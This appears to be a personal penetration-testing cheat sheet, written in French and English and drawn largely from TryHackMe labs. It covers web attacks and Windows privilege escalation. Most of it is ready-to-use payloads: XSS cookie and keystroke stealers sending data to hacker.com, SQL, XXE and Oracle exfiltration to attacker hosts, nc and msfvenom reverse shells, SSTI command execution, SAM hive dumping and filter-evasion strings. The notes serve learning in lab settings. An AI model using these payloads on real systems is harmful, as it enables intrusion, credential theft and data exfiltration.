+indetectable scan: nmap -sN ip ou nmap -T1 ip = SYN stealth scan avec --data-length 8 5% detectable et nmap -sS -T1 -f ip 6% detectable
+
+hydra -l user -P wordlist ftp://ip port = 10021
+
+command ftp : ascii,ls,get nom_fichier
+
+====================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==================================================
+
+Web fundamentals
+
+Introduction : - View-source:URL ou avec ctrl + u => Voir le chemin de dossier
+           - Inspector Learn how to inspect page elements and make changes to view => Pour display le composent ou obfusquer le page chaque ex : display : none avant display : block;
+           - Debugger inspect and control the flow of page's JavaScript => Pour changer le js et on clique sur numero de ligne de code et la partie devient jaune pour stocker une instruction
+           - Network see all the network requests a page makes => pour voir le response et le request et aussi Ajax
+
+Content Discovery 
+
+Intro : three man ways of discovering content on a website which  we'll cover .Manually, Automated and OSINT (Open-Source intelligence)
+
+Manual discovery : -Robots.txt
+               -sitemap.xml
+               -favicon.ico => linux : curl https://ghfhghjfh.vff/favicon.ico | md5sum
+                           => windows : curl https://static-labs.tryhackme.cloud/sites/favicon.ico -UseBasicParsing -o favicon.ico
+                                        Get-FileHash .\favicon.ico -Algorithm md5
+                           Apres on le mene le hash au https://wiki.owasp.org/index.php/OWASP_favicon_database. Apres on sait le framework provient de cet icon
+               -HTTP headers 
+                           => curl http://ip -v
+               -Framework stack => dans le site ctrl + I comme Inspector 
+               
+OSINT           :  -Google hacking/Dorking
+                                     => site:url avec tire(-) url exclue de la recherche
+                                     => inurl:
+                                     => intitle:
+                                     => intext:
+                                     => filetype:
+               -Wappalyzer
+               -Wayback Machine 
+                                => https://archive.org/web/
+               -github
+               -s3 Buckets {name-companie}.s3.amazonaws.com ,{}-assets.s3.amazonaws.com,{}-public.s3.amazonaws.com,{}-private,{}-www
+
+Automated Discovery : 
+                => gobuster dir -u URL -w wordlist.txt 
+                => ffuf -w <PATH> -u URL=http://.com/FUZZ
+                => dirb URL <PATH>
+
+subdomains enumeration :
+
+Intro : we will explore three different subdomain enumeration methods: Brute force ,OSINT,virtual host
+
+OSINT           : 
+            => tous le log de sous domaine parfois dans https://crt.sh and https://ui.ctsearch.entrust.com/ui/ctsearchui 
+            => -site:www.tryhackme.com site:*.tryhackme.com
+            => ./sublist3r.py -d acmeitsupport.thm
+
+Brute force     :
+            => dnsrecon -t brt -d acmeitsupport.thm
+
+Virtual host    :
+            => ffuf -w <PATH> -H "Host: FUZZ.acmeitsupport.thm" -u http://ip avec -fs {size} si il y a faux positive
+
+Authentication bypass : 
+
+Username enumeration : 
+               => ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists "(sur le front)
+
+brute-force :
+        => ffuf -w valide_username.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://ip/customers/login -fc 200
+
+logic flaw : 
+       => curl 'http://ip/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+
+Cookie Tampering :
+             => curl http://ip/cookie-test
+             => curl -H "Cookie: logged_in=true; admin=false" http://ip/cookie-test
+             => admin=true
+
+IDOR : 
+             => http://online-service.thm/profile?user_id=100
+
+             l'id peut etre encode en base64 ou hasher en md5
+             creer 2 compte et l'observe la different 
+             et aussi regarde dans network pour voir la requete et voir l'id et l'Ajax
+
+FILE INCLUSION :
+           exemple : http://webapp.thm/get.php?file=UserCV.pdf
+           cause : file_get_content fonction php
+           exploit => /etc/passwd
+                      ../../../../etc/passwd
+                      ../../../../etc/passwd%00
+                      ....//....//....//....//etc/passwd
+                      dossier_obligatoire/../../../../../etc/passwd
+
+             
+
+SSRF  :
+    SSRF=Server-Side Request Forgery et d'autre type est le blind SSRF la resultat ne retourne pas au hacker
+    but => Acces non authorise
+        => Revele l'authentication tokens/ le secret
+        => capabilite d'entre dans le reseau interne
+        => Acces de donne d'employe et l'organisation
+
+    exemple 1 - http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123
+            remplace par =http://api.website.thm/api/user 
+            2 - http://website.thm/stock?url=/item?id=123
+            remplace par http://website.thm/stock?url=/../user
+            3 - http://website.thm/stock?server=api&id=123
+            remplace par =api.website.thm/api/user&x=&id=123
+            4 - http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123
+            remplace par =http://hacker-domain.thm/ on obtient API key
+
+            avec &x= pour la fin de la requete
+
+    Pour detecter le SSRF : - http://df.thm/form?server=http://server.website.thm/store
+                            value="http://server.website.thm/store"
+                            - URL=api
+                            - https://website.thm/form?dst=/forms/contact 
+                            
+    dans le value icon change en x/../private
+
+XXS : 
+<script>alert('XSS');</script>
+<script>fetch('https://hacker.com/steal?cookie=' +btoa(document.cookie));</script>
+<script>document.onkeypress = function(e) {fetch('https://hacker.thm/log?key' + btoa(e.key));}</script>
+<script>user.changeEmail('attacker@gmail.com')</script>
+XXS Hunter Express outil pour attaque en blind xss 
+DOM XSS eval() est la vulnerabilities 
+
+hint => <script>alert("THM");</script>
+        Emmy"><script>alert('THM1');</script>
+        </textarea><script>alert("THM2");</script>
+        ';alert("THM3");//
+        <sscriptcript>alert("THM4");</sscriptcript>
+        /images/cat.jpg" onload="alert("THM");
+        jaVasCript:/*-/*`/*\`/*'/**/(/ * (/* */oNerror=alert('THM') )//%0D%0A%0d%0a//</style></tiTle></textArea/</scRipt/--!>\x3csvg/onloAd=alert('THM')//>\x3e
+
+Command execution :
+                timeout pour blind injecton
+                github : https://github.com/payloadbox/command-injection-payload-list 
+
+
+Race condition : 
+            Envoi de millier de requete au serveur qui utilise de thread pour passe la premier verification 
+            outil : burpsuite repeter + groupe + send parallel
+
+============================================================xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=========================================================
+
+WORDPRESS HACKING
+
+wpscan --url <url> -e --api-token <tokensitewpascan> avec --plugins-detection aggressive
+wpscan --url <url> -e vt,vp,u ou -e u,m,at,ap,dbe,cb, --api-token --disable-tls-checks
+wpscan --url <url> -U 'username1,user2' -P <path> --password-attack xmlrpc ou wp-login ou xmlrpc-multicall
+
+wpscan -h
+view-source:site.com rechercher generator puis a cote il y a le version de wordpress 
+
+===========================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX===========================================================
+
+Gobuster 
+
+pour content discovery : gobuster dir -u "http://fdfdfd.com" -w /usr/share/dirbuster/directory-list-2.3-medium.txt
+                      avec -r pour accepter la Redirection, -x .php,.js pour chercher cet fichier avec cet extension avec -t 64 avec 64 requete,
+                      --no-tls-validation pour eviter le tls verification
+
+pour subdomain ou dns  : gobuster dns -d exemple.com -w /usr/share/dirbuster/directory-list-2.3-medium.txt
+
+pour le vhost          : gobuster vhost -u "http://ip" --domain exemple.com -w <PATH> --append-domain --exclude-length 250-320 
+
+==========================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX============================================================
+
+WINDOWS PRIVILEGE ESCALATION 
+
+Windows Users : -> Administrators 
+            -> Standart users
+            -Autre SYSTEM/LocalSystem : An Account used by the operating system to perform internal tasks. It has full access to all files and resources available                on the host with even higher privileges than Administrators .
+            -Local Service : default account used to run windows service with "minimum" privileges.It will use anonymous connections over the network
+            -Network Service : Default account used to run windows services with "minimum" privileges. It will use the computer credentials to authenticate 
+            through the network.
+            
+Harvesting Passwords from Usual Spots
+            ->Unattended Windows Installations :
+
+            C:\Unattend.xml
+            C:\Windows\Panther\Unattended.xml
+            C:\Windows\Panther\Unattended\Unattended.xml
+            C:\Windows\system32\sysprep.inf
+            C:\Windows\system32\sysprep\sysprep.xml 
+
+            <Credentials>
+                <Username>Administrators<Username>
+                <Domain>thm.local</Domain>
+                <Password>Password</Password>
+            </Credentials>
+
+            -> Powershell history
+            
+            type %userprofile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt avec $Env:userprofile sur terminal powershell
+
+            -> Saved Windows Credentials 
+
+            cmdkey /list or runas /savecred /user:admin cmd.exe 
+
+            -> IIS Configuration 
+
+            type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString 
+            or type C:\inetpub\wwwroot\web.config
+            
+            -> Retrieve Credentials from Software:Putty
+
+            reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+Other Quick Win :
+            -> Scheduled tasks
+            schtasks pour afficher le tache planifié 
+            schtasks /query /tn vulntask /fo list /v information de la tache
+            icacls C:\tasks\schtask.bat pour voir l'autorisation sur le fichier 
+            Ex : BUILTIN\Users:(F) -> Full control
+                 Everyone:(M) -> Modify
+                 thm-unpriv:(W) -> write 
+
+            C:\> echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat 
+
+            C:\> schtasks /run /tn vulntask
+
+            Pour voir que l'utilisateur a le droit de cree et execute le fichier .msi qui sert a installe des applications :
+
+            - C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+            - C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+            les 2 doivent contenir AlwaysInstallElevated = 1
+
+            payload MSI via msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+
+            msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi 
+
+Abusing Service Misconfigurations
+            -> Windows Services 
+               sc qc apphostsvc(nomduservice) 
+                affiche ou se trouve l'executable du service  
+                avec quel compte il s'execute
+                ses permission
+                son type
+
+            -> Insecure permissions on Service Executable 
+                sc qc WindowsScheduler
+                icacls C:\PROGRA-2\SYSTEM-1\wService.exe dans on a Everyone:(I)(M) c'est a dire on peut modifier le fichier
+                msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe 
+                python3 -m http.server 
+
+                wget http://ATTACKER_IP:8000/rev-svc.exe -o rev-svc.exe 
+
+                C:\> cd C:\PROGRA-2\SYSTEM-1\
+
+                C:\PROGRA-2\SYSTEM-1> move wService.exe wService.exe.bkp
+
+                C:\PROGRA-2\SYSTEM-1> move C:\Users\thm-unpriv\rev-svc.exe wService.exe
+
+                C:\PROGRA-2\SYSTEM-1> icacls wService.exe /grant Everyone:F
+
+                nc -nlvp 4445 
+
+                C:\> sc stop windowsscheduler
+                C:\> sc start windowsscheduler 
+
+            -> Unquoted Service Paths
+                sc qc "vncserver"
+                sc qc "disc sorter enterprise"
+                C:\Myprograms
+                C:\>icacls C:\Myprograms BUILTIN\\Users group has AD and WD privileges allowing the user to create subdirectories and files, respectively
+
+                msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe 
+
+                move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe 
+
+                icacls C:\MyPrograms\Disc.exe /grant Everyone:F 
+
+                sc stop "disk sorter enterprise"
+                sc start "disk sorter enterprise"
+
+            -> Insecure Service Permissions 
+                accesschk64.exe -qlc thmservice on peut voir BUILTIN\\Users groupe a une SERVICE_ALL_ACCESS permission que l'user peut le configure 
+                msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe 
+
+                nc -nlvp 4447 
+
+                C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+
+                C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+                
+                C:\> sc stop THMService
+                C:\> sc start THMService
+
+Abusing dangerous privileges 
+            -> Windows privileges 
+             whoami /priv
+            
+            -> SeBackup/SeRestore 
+             reg save hklm\system C:\Users\THMBackup\system.hive 
+             reg save hklm\sam C:\Users\THMBackup\sam.hive 
+
+             mkdir share
+             python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share 
+             copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+             copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+
+             python3 /opt/impacket/exemples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+
+             python3 /opt/impacket/examples/psexec.py -hashes <dans secretsdump> administrators@10.10.215.78 
+                
+            -> SeTakeOwnership
+             utilman.exe 
+             takeown /f C:\Windows\System32\Utilman.exe 
+             icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+             copy cmd.exe utilman.exe 
+             
+            -> Selmpersonate / SeAssignPrimaryToken 
+             c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.6.60.76 4442"
+             nc -nlvp 4442
+
+Abusing vulnerable software 
+            -> Unpatched Software
+             wnic product get name,version,vendor
+             wnic product
+             Exploit-DB,packet storm
+
+            -> Case Study:Druva inSync 6.6.3
+
+Tools of the Trade 
+            -> WinPEAS
+            winpeas.exe > outputfile.text
+
+            -> PrivescCheck
+            Set-ExecutionPolicy Bypass -Scope process -Force 
+            .\PrivescCheck.ps1
+            Invoke-PrivescCheck
+
+            -> WES-NG:Windows Exploit Suggester - Next Generation 
+            wes.py --update
+            wes.py systeminfo.txt 
+
+            -> Metalisploit 
+            multi/recon/local_exploit_suggester
+
+
+==================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==========================================================
+
+OWASP Top 10 2025: IAAA Failures 
+
+
+Identity - the unique account (e.g., user ID/email) that represents a person or service.
+Authentication - proving that identity (passwords, OTP, passkeys).
+Authorisation - what that identity is allowed to do.
+Accountability - recording and alerting on who did what, when, and from where.
+
+
+=================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX===========================================================
+
+Advanced SQL Injection 
+
+SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))
+SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin 
+SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)
+SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--
+
+curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://MACHINE_IP/httpagent/
+
+Out-of-band SQL Injection :
+python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp
+smbclient //ATTACKBOX_IP/logs -U guest -N 
+
+1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; -- pour MariaDB
+
+EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T'; pour MSSQL
+
+DECLARE
+req UTL_HTTP.REQ;
+resp UTL_HTTP.RESP;
+BEGIN
+req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
+UTL_HTTP.GET_RESPONSE(req);
+END; pour ORACLE 
+
+@@basedir pour le lien de dossier MYSQL 
+
+EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
+
+Filter Evasion Techniques:
+Encodage URL ' OR 1=1 -- devient %27%20OR%201%3D1--
+Encodage HEX SELECT * FROM users WHERE name = 'admin' devient SELECT * FROM users WHERE name = 0x61646d696e
+Unicode Encoding admin devient \u0061\u0064\u006d\u0069\u006e
+
+Intro to PHP' OR 1=1 -- devient Intro to PHP' || 1=1 -- devient Intro%20PHP%20%7C%7C%201%3D1%20%2D%2D 
+
+No-Quote SQL Injection: 
+Using Numerical Values : ' OR '1'='1 devient OR 1=1
+Using SQL comment : admin'-- devient admin
+Using CONCAT() function CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e) = admin 
+
+No Spaces Allowed: 
+Comments to Replace Spaces: SELECT * FROM users WHERE name = 'admin' devient SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'
+Tab or Newline Characters: SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin' \t = \n
+Alternate Characters: One effective method is using alternative URL-encoded characters representing different types of whitespace, such as %09 (horizontal tab), %0A (line feed), %0C (form feed), %0D (carriage return), and %A0 (non-breaking space). These characters can replace spaces in the payload. 
+
+1' OR 1=1 -- devient 1'%0A||%0A1=1%0A--%27+ 
+
+==========================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX====================================================
+
+NoSQL Injection 
+
+{"_id" : ObjectId("5f077332de2cdf808d26cd74"), "username" : "lphillips", "first_name" : "Logan", "last_name" : "Phillips", "age" : "65", "email" : "lphillips@example.com" }
+
+rechercher :
+['last_name' => 'Sandler']
+['gender' => 'male', 'last_name' => 'Phillips']
+['age' => ['$lt'=>'50']]
+
+user[$ne]=yyyy&pass[$ne]=xxxx 
+
+['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'aweasdf']] post user[$nin][]=admin&pass[$ne]=aweasdf
+
+['username'=>['$nin'=>['admin', 'jude'] ], 'password'=>['$ne'=>'aweasdf']] post user[$nin][]=admin&user[$nin][]=jude&pass[$ne]=aweasdf
+
+post user=admin&pass[$regex]=^.{5}$
+ user=admin&pass[$regex]=^c....$
+ admin'||1||'
+
+=============================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX===============================================================
+
+JWT
+
+curl -H "Authorization: Bearer " url 
+
+HS256 = symetrique
+
+non verification signature effacer la partier signature
+
+"alg" = "None"
+
+hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
+
+===========================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==============================================================
+
+XXE 
+
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<contact>
+<name>
+    &xxe;
+</name>
+</contact>
+
+version encodage
+<!DOCTYPE foo [
+<!ELEMET foo ANY >
+<!ENTITY xxe SYSTEM 
+"php://filter/convert.base64-encode/resource=/etc/passwd">]>
+<contact>
+<name>
+    &xxe;
+</name>
+</contact>
+
+<!DOCTYPE foo [
+<!ENTITY lol "lol"
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+
+cas d'upload photo et on le met cet simple.dtd
+
+<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
+%oobxxe;
+
+<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/simple.dtd">
+<upload>
+<file>&exfil;</file>
+</upload>
+
+SSRF + XXE
+
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM "http://localhost:/">
+]>
+<contact>
+<name>&xxe;</name>
+<email>test@test.com</email>
+<message>test</message>
+</contact>
+
+libxml_disable_entity_loader(true); en php pour protege contre xxe 
+
+===============================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=============================================================
+
+SSTI 
+
+en php: smarty,twig
+en js ou node.js: pug,jade
+en python : ninja2,tomoe,mako
+
+jinja2/twig: {{7*7}}
+
+jade: #{7*7},#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
+  #{root.process.mainModule.require('child_process').spawnSync('ls',['-lah']).stdout}
+
+smarty: {'hello'|upper},{system("ls")}//reverse shell generator{system("php -r '\$sock=fsockopen(\"ATTACKER_IP\",1234);passthru(\"sh <&3 >&3 2>&3\");'")}
+
+python sstimap.py -X POST -u http://URL -d 'page=' --os-shell
+
+jinja2: {{"".class__.mro__[1].__subclasses__()[157].__repr__.__globals__.get("__import__")("subprocess").check_output(['ls','-lah'])]}}
+
+exec('id')
+
+curl -o /tmp/shell.php http://ATTACKER_IP:1233/shell.php && php shell.php
+
+=================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=========================================================
+
+LDAP
+
+Service that use LDAP : Microsoft active directory , openLDAP
+
+dc=ldap,dc=thm => subdomain (OUs) ou=people or ou=groups
+
+cn=John Doe,ou=people,dc=example,dc=com (Distinguished Names (DNS))
+cn=John Doe cn=Common name (Relative Distinguished Names)
+mail=john@example.com for an email address (Attribute)
+
+search Queries : Base DN
+             Scope : base,one,sub 
+             filter
+             Attribute
+
+             (Base DN) (scope) (filter) (attributes)
+
+             (cn=John Doe) (cn=J*)
+             (&(objetClass=user)(|(cn=John*)(cn=Jane*))) &,|,!
+
+port 389,636
+
+ldapsearch -x -H ldap://MACHINE_IP -b "dc=ldap,dc=thm" "(ou=people)"
+
+(&(uid={userInput})(userPassword={passwordInput})) normal
+
+(&(uid=*)(|(&)(userPassword=pwd)))
+
+username=*&password=*
+username=f*&password=* compte avec le lettre f
+
+echo ')(|(&' | jq -sRr @uri Encryption
+
+blind-ldap username=a*%29%28%7C%28%26&password=pwd%29 resultat (&(uid=a*)(|(&)(userPassword=pwd)))
+
+=======================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX====================================================
+
+ORM injection
+
+whereRaw() no secure 
+
+where() secure 
+
+1'
+
+1' OR '1' = '1 
+
+-> "%27))
+
+======================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=====================================================
+
+Insecure Deserialisation
+
+pickle : python
+serialize() : php
+serializable : java 
+BinaryFormatter,System.Text.Json,System.Xml.Serialization  : .Net 
+Marshal : ruby
+
+inde.php~ pour ouvrir le fichier temporaire ou d’accéder à des fichiers de sauvegarde ou temporaires
+
+Base64 encoded values in cookies (PHP and .NET)
+__VIEWSTATE pour ASP.NET 
+
+<?php
+class MaliciousUserData {
+public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
+}
+
+$maliciousUserData = new MaliciousUserData();
+$serializedData = serialize($maliciousUserData);
+$base64EncodedData = base64_encode($serializedData);
+echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
+?>
+
+PHP Gadge Chain (PHPGGC)
+akin to Ysoserial in the Java ecosystem
+
+php phpggc -l laravel
+
+php phpggc -b Laravel/RCE3 system whoami en base64
+
+php phpggc Laravel/RCE3 system whoami 
+
+O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"*events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"*app";s:6:"whoami";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"assert";}}}
+
+php phpggc -b Laravel/RCE3 system 'uname -r' puis encode en URL
+
+curl http://10.49.151.178:8089 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6InRqcnhLTXVSMnllU0E5ODlZcmQ3YkE9PSIsInZhbHVlIjoieFN2TVRVTUMxZnZKM1pKUUVhbmJ4R2UzenJlS1lScUxcL1pnWmFRcElkQkl3U1FVenRTZzJkbFZoaklXaWx5ajJjZVlIZTlnMzFDeVhHcmltb2VtSXpic3JOVlQ0UFZcL3VNeXhTUDVWb3VKMFwvT0czeUNTNU9ZRjBWOTBaRWpHS0FHZFdtNzZ0b1dwUnh1OWxzUThCSzE5MVJKYVwvU0JjbFlVZEJ1SFJwXC83ZVYyYkk1cWNSVk1yYnQ4Z2tmUkRhMkFcL0tqVXQ3Z29MdXBHUVVBaUQyUldEOFNORTZHa3BCN0xyS28weEI3ekZWMkdXbzN0RDlVTlRDUlNBSEs0dFgzZ1VoaTdDVDFvWmtiTTRzcmVRYTVVUTJEMWdYOEhDSndqVUZ0MHU0MzNTZ0U5Y0ludmFcL2ZUbm9QTUo0V1F4dk9oIiwibWFjIjoiOThkYTY0MTZlZTAyNmYzZTQ3NzVhZjE5MjAyYjc5OGJkNDEzZWEzZGI2YTZmM2UzYmEzMzBjZGFmZmVkMWI0ZiJ9' | head -n 3
+
+Pour utiliser Ysoserial, un attaquant générerait généralement une charge utile avec une commande telle que java -jar ysoserial.jar [payload type] '[command to execute]', où [payload type]C’est le type d’exploit et [command to execute]est la commande arbitraire qu'ils souhaitent exécuter sur le système cible. Par exemple, en utilisant le CommonsCollections1Le type de charge utile peut ressembler à ceci: java -jar ysoserial.jar CommonsCollections1 'calc.exe'. Cette commande génère un objetsérialisé qui exécutera la commande spécifiée lorsqu'elle sera désérialisée par une application vulnérable.
+
+===============================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=============================================================
+
+prototype pollution
+
+automatisation : NodeJsScan, Prototype pollution scanner, PPFuzz, BlackFan
+__proto__,constructeur,_set
+
+_set(friend,input.path,input.value)
+
+{"path":"reviews[0].content", "value": "<script>alert("hacked")</script>"}
+
+{"__proto__":{"newProprety": "value"}}
+
+pollue la Object.prototype.toString car il est tres utilise 
+
+{"__proto__":{"toString": "Just crash the server"}}
+          "toLocaleString"
+
+===============================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX===============================================================
+
+path traversal / file include 
+
+../../../../etc/passwd
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/string.rot13/resource=.htaccess
+php://filter/string.toupper/resource=.htaccess 
+php://filter/string.tolower/resource=.htaccess
+php://filter/string.strip_tags/resource=.htaccess 
+
+Data Wrapper:
+
+data:text/plain,<?php%20phpinfo();%20?>
+
+LFI2RCE Sessions files
+session.php?page=<?php%20echo%20phpinfo();%20?>
+session.php?page=/var/lib/php/sessions/sess_[SESSIONID];
+
+LFI2RCE log poisoning
+$nc 10.10.154.125(ATTACKBOX_IP) 80 
+<?php echo phpinfo(); ?>
+
+playground.php?page=/var/log/apache2/access.log 
+/var/log/mail.log 
+/var/log/auth.log
+
+Wrappers
+<?php system($_GET['cmd']); echo 'Shell done!';?>
+php://filter/convert.base64-decode/resource=data://plain/text,[SHELL ENCODED64]&cmd=whoami
+
+==================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==========================================================
+
+XSS
+Same-Origin Policy (SOP) protege contre l'execution de script d'acceder aux donne par d'autre page 
+btoa()=function js encodage base64 
+atob()= decodage 
+Content Security Policy (CSP) le Misconfiguration unsafe-inline or unsafe-eval 
+
+outil de convertion en html de caracteur , >, &, ", and ':
+htmlspecialchars($search_query); pour php 
+const sanitizeHtml = require('sanitize-html'); const sanitizedSearchTerm = sanitizeHtml(searchTerm); jaVasCript
+from html import escape escaped_query = escape(query) python 
+HttpUtility.HtmlEncode(userInput); asp.net
+
+?k304=y <img src=copyparty onerror=alert(1)>  CVE-2023-38501 ?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
+evasion = https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html 
+          https://github.com/terjanq/Tiny-XSS-Payloads 
+
+        
+    L'onglet horizontal (TAB) est 9en représentation hexadécimale
+    Nouvelle ligne (LF) est Aen représentation hexadécimale
+    Le retour de transport (CR) est Den représentation hexadécimale
+
+     <IMG SRC="javascript:alert('XSS');"> : <IMG SRC="jav&#x09;ascript:alert('XSS');">
+                                            <IMG SRC="jav&#x0A;ascript:alert('XSS');">
+                                            <IMG SRC="jav&#x0D;ascript:alert('XSS');">
+
+
+==================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX====================================================
+
+CSRF ou XSRF 
+CSRF_token 
+
+==================================================================XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=====================================================
+
+
+https://primer.picoctf.org/\#_substitution_ciphers
